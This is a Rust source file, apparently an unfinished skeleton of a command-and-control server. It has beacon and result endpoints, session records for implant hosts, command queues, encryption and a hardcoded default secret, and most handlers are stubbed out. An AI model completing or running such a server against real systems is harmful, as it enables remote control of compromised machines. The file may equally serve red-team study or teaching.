use std::collections::HashMap;
use std::sync::Arc;
use std::{env::args, net::SocketAddr};

use aes_gcm::Aes256Gcm;
use axum::{Router, routing::post};
use chrono::{DateTime, Utc};
use serde::Serialize;
use tokio::sync::RwLock;

#[derive(Clone)]
struct Crypto {
    cipher: Aes256Gcm,
}

impl Crypto {
    fn new(secret: &str) -> Self {
        todo!();
    }
}

#[derive(Debug, Clone)]
struct Session {
    id: String,
    hostname: String,
    username: String,
    os: String,
    pid: u32,
    process: String,
    arch: String,
    integrity: String,
    first_seen: DateTime<Utc>,
    last_seen: DateTime<Utc>,
    checkins: u64,
}

#[derive(Debug, Clone, Serialize)]
struct CommandData {
    id: String,
    #[serde(rename = "type")]
    command_type: String,
    args: Vec<String>,
    timeout: Option<u64>,
}

struct AppState {
    crypto: Crypto,
    sessions: RwLock<HashMap<String, Session>>,
    pending_command: RwLock<HashMap<String, Vec<CommandData>>>,
    results: RwLock<Vec<(String, String, bool, String)>>,
}

async fn handle_beacon() {
    unimplemented!()
}

async fn handle_result() {
    unimplemented!()
}

#[tokio::main]
async fn main() {
    let port: u16 = args()
        .position(|a| a == "--port")
        .and_then(|i| args().nth(i + 1))
        .and_then(|s| s.parse().ok())
        .unwrap_or(1337);
    let secret = args()
        .position(|a| a == "--secret")
        .and_then(|i| args().nth(i + 1))
        .unwrap_or_else(|| "super-secret-key".to_string());

    let state = Arc::new(AppState {
        crypto: Crypto::new(&secret),
        sessions: RwLock::new(HashMap::new()),
        pending_command: RwLock::new(HashMap::new()),
        results: RwLock::new(Vec::new()),
    });

    let app = Router::new()
        .route("/api/beacon", post(handle_beacon))
        .route("/api/result", post(handle_result))
        .with_state(state.clone());

    let addr = SocketAddr::from(([0, 0, 0, 0], port));

    println!(
        "\n[*]    Listening on {}",
        format!("http://0.0.0.0:{}", port)
    );
    println!("[*]    Secret {}\n", secret);

    tokio::spawn(async move {
        let listener = tokio::net::TcpListener::bind(&addr).await.unwrap();
        axum::serve(listener, app.into_make_service())
            .await
            .unwrap();
    });

    unimplemented!()
}
